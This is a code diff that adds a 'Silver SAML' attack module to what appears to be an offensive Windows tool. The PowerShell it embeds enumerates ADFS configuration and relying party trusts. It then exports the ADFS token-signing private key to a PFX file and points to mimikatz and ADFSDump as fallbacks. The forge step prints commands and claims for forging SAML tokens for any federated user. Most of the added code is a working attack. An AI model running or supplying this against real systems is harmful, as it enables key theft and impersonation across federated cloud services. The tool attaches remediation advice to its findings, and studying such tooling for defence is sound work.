@@ -21532,6 +21532,294 @@ if ($results.Count -eq 0) {
   return { output: output.join("\n"), findings }
 }
 
+async function silverSaml(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const adfsServer = argVal(args, "--adfs-server")
+  const targetUser = argVal(args, "--target-user")
+  const audience = argVal(args, "--audience")
+  const certPath = argVal(args, "--cert-path")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Silver SAML attack operations...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== ADFS / Federation Configuration ==="
+Write-Output ""
+
+# Check if ADFS role is installed locally
+$adfs = Get-Service adfssrv -ErrorAction SilentlyContinue
+if ($adfs) {
+  Write-Output "[+] ADFS Service found locally: $($adfs.Status)"
+  Write-Output "ADFS_LOCAL=1"
+  Write-Output ""
+
+  # ADFS configuration
+  try {
+    Import-Module ADFS -ErrorAction SilentlyContinue
+    $adfsProps = Get-AdfsProperties -ErrorAction SilentlyContinue
+    if ($adfsProps) {
+      Write-Output "Federation Service Name: $($adfsProps.HostName)"
+      Write-Output "Federation Service Identifier: $($adfsProps.Identifier)"
+      Write-Output "IdP SSO URL: https://$($adfsProps.HostName)/adfs/ls/"
+      Write-Output ""
+    }
+
+    # Token-signing certificates
+    Write-Output "=== Token-Signing Certificates ==="
+    $certs = Get-AdfsCertificate -CertificateType Token-Signing -ErrorAction SilentlyContinue
+    foreach ($cert in $certs) {
+      Write-Output "  Subject: $($cert.Certificate.Subject)"
+      Write-Output "  Thumbprint: $($cert.Thumbprint)"
+      Write-Output "  NotAfter: $($cert.Certificate.NotAfter)"
+      Write-Output "  IsPrimary: $($cert.IsPrimary)"
+      Write-Output "  StoreLocation: $($cert.StoreLocation)"
+      Write-Output "  CERT_THUMB=$($cert.Thumbprint)"
+      Write-Output ""
+    }
+
+    # Relying Party Trusts (targets for forged tokens)
+    Write-Output "=== Relying Party Trusts ==="
+    $rps = Get-AdfsRelyingPartyTrust -ErrorAction SilentlyContinue
+    $rpCount = ($rps | Measure-Object).Count
+    Write-Output "Total: $rpCount"
+    Write-Output "RP_COUNT=$rpCount"
+    Write-Output ""
+    foreach ($rp in $rps) {
+      Write-Output "  --- $($rp.Name) ---"
+      Write-Output "    Identifier: $($rp.Identifier -join ', ')"
+      Write-Output "    SamlEndpoint: $($rp.SamlEndpoints | ForEach-Object { $_.Location } | Select-Object -First 1)"
+      Write-Output "    Enabled: $($rp.Enabled)"
+      Write-Output "    SignatureAlgorithm: $($rp.SignatureAlgorithm)"
+      Write-Output "    IssuanceRules: $(if ($rp.IssuanceTransformRules) { 'YES' } else { 'NONE' })"
+      Write-Output ""
+    }
+  } catch {
+    Write-Output "[-] Cannot query ADFS config: $_"
+    Write-Output "    Need local admin on ADFS server or ADFS management tools"
+  }
+} else {
+  Write-Output "[*] ADFS not installed locally"
+  Write-Output "ADFS_LOCAL=0"
+}
+
+# Check domain federation configuration via AD
+Write-Output ""
+Write-Output "=== Domain Federation Settings ==="
+try {
+  $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+  Write-Output "Domain: $($domain.Name)"
+
+  # Check for Azure AD Connect (federation indicator)
+  $searcher = New-Object System.DirectoryServices.DirectorySearcher
+  $searcher.Filter = "(|(cn=MSOL_*)(cn=AAD_*))"
+  $searcher.PropertiesToLoad.AddRange(@('cn', 'description', 'whenCreated'))
+  $syncAccounts = $searcher.FindAll()
+  if ($syncAccounts.Count -gt 0) {
+    Write-Output "[+] Azure AD Connect sync accounts found:"
+    foreach ($sa in $syncAccounts) {
+      Write-Output "    $($sa.Properties['cn'][0]) — Created: $($sa.Properties['whencreated'][0])"
+    }
+    Write-Output "AAD_CONNECT=1"
+  } else {
+    Write-Output "[*] No Azure AD Connect sync accounts found"
+    Write-Output "AAD_CONNECT=0"
+  }
+
+  # Check for ADFS service accounts
+  $searcher.Filter = "(servicePrincipalName=host/sts.*)"
+  $adfsAccounts = $searcher.FindAll()
+  if ($adfsAccounts.Count -gt 0) {
+    Write-Output ""
+    Write-Output "[+] ADFS service accounts/servers:"
+    foreach ($a in $adfsAccounts) {
+      $spns = $a.Properties['serviceprincipalname']
+      foreach ($spn in $spns) {
+        if ($spn -match 'host/(.+)') { Write-Output "    ADFS Server: $($Matches[1])" }
+      }
+    }
+  }
+} catch {
+  Write-Output "[-] Domain query failed: $_"
+}
+
+# Check for Entra ID federation metadata
+${adfsServer ? `
+Write-Output ""
+Write-Output "=== Federation Metadata ==="
+try {
+  $metaUrl = "https://${adfsServer}/FederationMetadata/2007-06/FederationMetadata.xml"
+  Write-Output "Fetching: $metaUrl"
+  $meta = Invoke-WebRequest -Uri $metaUrl -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
+  Write-Output "[+] Federation metadata retrieved ($($meta.Content.Length) bytes)"
+  # Extract signing certificate from metadata
+  if ($meta.Content -match 'X509Certificate>([^<]+)<') {
+    Write-Output "[+] Token-signing certificate found in metadata"
+    Write-Output "    (Public portion only — need private key for forgery)"
+    Write-Output "META_CERT=1"
+  }
+} catch {
+  Write-Output "[-] Cannot fetch metadata: $_"
+}
+` : ''}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const isLocalAdfs = r.stdout.includes("ADFS_LOCAL=1")
+    const rpCount = r.stdout.match(/RP_COUNT=(\d+)/)
+
+    if (isLocalAdfs) {
+      findings.push({
+        checkId: "WIN-SAML-001",
+        provider: "windows",
+        severity: "critical",
+        status: "ADFS_FOUND",
+        resource: "adfs://local",
+        title: "ADFS server found — Silver SAML attack possible if signing cert is extracted",
+        details: `ADFS is running locally${rpCount ? ` with ${rpCount[1]} relying party trusts` : ""}. Extract the token-signing certificate (private key) to forge SAML assertions for any federated user.`,
+        remediation: "Restrict ADFS admin access, use HSM for token-signing keys, enable Entra ID certificate rotation.",
+      })
+    }
+  }
+
+  if (action === "extract-cert") {
+    const script = `
+Write-Output "=== Token-Signing Certificate Extraction ==="
+Write-Output ""
+
+# Method 1: ADFS PowerShell module (if on ADFS server)
+try {
+  Import-Module ADFS -ErrorAction Stop
+  $certs = Get-AdfsCertificate -CertificateType Token-Signing
+
+  foreach ($cert in $certs) {
+    Write-Output "--- Certificate: $($cert.Thumbprint) ---"
+    Write-Output "  Subject: $($cert.Certificate.Subject)"
+    Write-Output "  IsPrimary: $($cert.IsPrimary)"
+    Write-Output "  HasPrivateKey: $($cert.Certificate.HasPrivateKey)"
+
+    if ($cert.Certificate.HasPrivateKey) {
+      Write-Output "  [+] Private key available!"
+      Write-Output ""
+
+      # Export as PFX
+      $exportPath = "$env:TEMP\\adfs-signing-$($cert.Thumbprint.Substring(0,8)).pfx"
+      $exportPass = "CyberStrike$(Get-Random -Minimum 1000 -Maximum 9999)"
+      try {
+        $pfxBytes = $cert.Certificate.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $exportPass)
+        [System.IO.File]::WriteAllBytes($exportPath, $pfxBytes)
+        Write-Output "  [+] Exported to: $exportPath"
+        Write-Output "  [+] Password: $exportPass"
+        Write-Output "  EXPORT_PATH=$exportPath"
+        Write-Output "  EXPORT_PASS=$exportPass"
+        Write-Output "  EXTRACT_STATUS=SUCCESS"
+      } catch {
+        Write-Output "  [-] Export failed: $_ (key may be non-exportable or in HSM)"
+        Write-Output "  [*] Try: mimikatz crypto::certificates /export /store:My"
+        Write-Output "  EXTRACT_STATUS=EXPORT_FAILED"
+      }
+    } else {
+      Write-Output "  [-] No private key access"
+      Write-Output "  [*] Certificate may be stored in:"
+      Write-Output "      - LocalMachine\\My certificate store"
+      Write-Output "      - ADFS DKM container in AD"
+      Write-Output "      - Hardware Security Module (HSM)"
+    }
+    Write-Output ""
+  }
+} catch {
+  Write-Output "[-] ADFS module not available: $_"
+  Write-Output ""
+  Write-Output "[*] Alternative extraction methods:"
+  Write-Output ""
+
+  # Method 2: Certificate store directly
+  Write-Output "=== Local Certificate Store ==="
+  $store = New-Object System.Security.Cryptography.X509Certificates.X509Store('My', 'LocalMachine')
+  $store.Open('ReadOnly')
+  $signingCerts = $store.Certificates | Where-Object {
+    $_.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.37' } | ForEach-Object {
+      $_.Format($false) -match 'Digital Signature'
+    }
+  }
+  foreach ($c in $signingCerts) {
+    Write-Output "  Subject: $($c.Subject)"
+    Write-Output "  Thumb: $($c.Thumbprint)"
+    Write-Output "  HasPrivateKey: $($c.HasPrivateKey)"
+    Write-Output "  NotAfter: $($c.NotAfter)"
+    Write-Output ""
+  }
+  $store.Close()
+
+  # Method 3: ADFS DKM (Distributed Key Management) container in AD
+  Write-Output "=== ADFS DKM Container ==="
+  Write-Output "[*] ADFS stores encryption keys in AD container:"
+  Write-Output "    CN=ADFS,CN=Microsoft,CN=Program Data,DC=..."
+  Write-Output "[*] Extract with:"
+  Write-Output "    ADFSDump.exe (reads DKM key + encrypted PFX from AD)"
+  Write-Output "    mimikatz lsadump::dcsync /user:ADFS_SVC (if ADFS uses gMSA)"
+  Write-Output "EXTRACT_STATUS=MANUAL_REQUIRED"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("EXTRACT_STATUS=SUCCESS")) {
+      const exportPath = r.stdout.match(/EXPORT_PATH=(.+)/)
+      findings.push({
+        checkId: "WIN-SAML-010",
+        provider: "windows",
+        severity: "critical",
+        status: "EXTRACTED",
+        resource: exportPath ? exportPath[1] : "adfs://signing-cert",
+        title: "ADFS token-signing certificate extracted with private key",
+        details: "Token-signing certificate exported as PFX. This key can forge SAML tokens for ANY federated user, granting access to all relying party trusts (O365, AWS, etc.).",
+        remediation: "Rotate ADFS signing certificate immediately, revoke current certificate, audit federated access logs.",
+      })
+    }
+  }
+
+  if (action === "forge") {
+    if (!certPath) {
+      output.push("ERROR: --cert-path required for forge action (path to exported PFX)")
+      return { output: output.join("\n"), findings }
+    }
+    if (!targetUser) {
+      output.push("ERROR: --target-user required for forge action")
+      return { output: output.join("\n"), findings }
+    }
+    output.push("=== SAML Token Forgery ===")
+    output.push("")
+    output.push("[!] SAML token forgery requires compiled tools for proper XML signing")
+    output.push("[*] Use one of the following approaches:")
+    output.push("")
+    output.push("Option 1: ADFSToolkit (PowerShell)")
+    output.push(`  New-SAMLToken -Certificate '${certPath}' -User '${targetUser}' \\`)
+    output.push(`    -Audience '${audience || "urn:federation:MicrosoftOnline"}' -Issuer 'http://ADFS_HOST/adfs/services/trust'`)
+    output.push("")
+    output.push("Option 2: SilverSAMLForger (Python)")
+    output.push(`  python3 silversaml.py --pfx '${certPath}' --user '${targetUser}' \\`)
+    output.push(`    --audience '${audience || "urn:federation:MicrosoftOnline"}' \\`)
+    output.push("    --domain DOMAIN.COM")
+    output.push("")
+    output.push("Option 3: Manual (for O365 specifically)")
+    output.push("  1. Generate SAML assertion with ImmutableID claim")
+    output.push("  2. POST to https://login.microsoftonline.com/login.srf")
+    output.push("  3. Extract access token from response")
+    output.push("")
+    output.push("Key claims to include:")
+    output.push("  - NameID: " + targetUser)
+    output.push("  - ImmutableID: Base64(ObjectGUID) for O365")
+    output.push("  - UPN: user@domain.com")
+    output.push("  - Groups/Roles: as needed for authorization")
+    output.push(`  - Audience: ${audience || "urn:federation:MicrosoftOnline"}`)
+    output.push("")
+    output.push("[*] After forging, use with azure_ad_hybrid --action token for cloud access")
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -25165,6 +25453,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   bits_persist: bitsPersist,
   wsus_abuse: wsusAbuse,
   golden_gmsa: goldenGmsa,
+  silver_saml: silverSaml,
 }
 
 export const WinhookTool = Tool.define("winhook", {
